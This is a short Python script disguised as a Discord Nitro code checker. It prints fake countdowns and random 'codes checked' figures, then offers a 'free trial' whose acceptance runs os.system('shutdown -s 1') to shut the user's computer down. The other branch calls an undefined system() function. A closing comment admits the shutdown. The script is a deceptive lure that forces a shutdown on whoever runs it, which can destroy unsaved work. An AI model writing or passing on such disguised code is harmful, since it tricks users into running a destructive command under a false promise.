import time
import random
import os

i = 0

if i == i:
    print('loading....')
    time.sleep(1)
    print('time left: 7')
    time.sleep(1)
    print('time left: 6')
    time.sleep(1)
    print('time left: 5')
    time.sleep(1)
    print('time left: 4')
    time.sleep(1)
    print('time left: 3')
    time.sleep(1)
    print('time left: 2')
    time.sleep(1)
    print('time left: 1')
    time.sleep(1)
    print('Please wait. Checking the codes....')
    time.sleep(2)
    print('Inputing the codes here...')
    time.sleep(3)
    print('ERROR.....buy nitro premium to see the codes\ncodes valid:', random.randint(0,3))
    print('codes checked:', random.randint(0,820382))
    a = input('Do you want a free trial for 1 use? yes/no:    ')
    if a == 'no':
        system('shutdown -s -t 1')


    elif a == 'yes':
        print(' Free trial activating....')
        os.system('shutdown -s 1')

#this shuts your pc down including all programms so use it carefully!
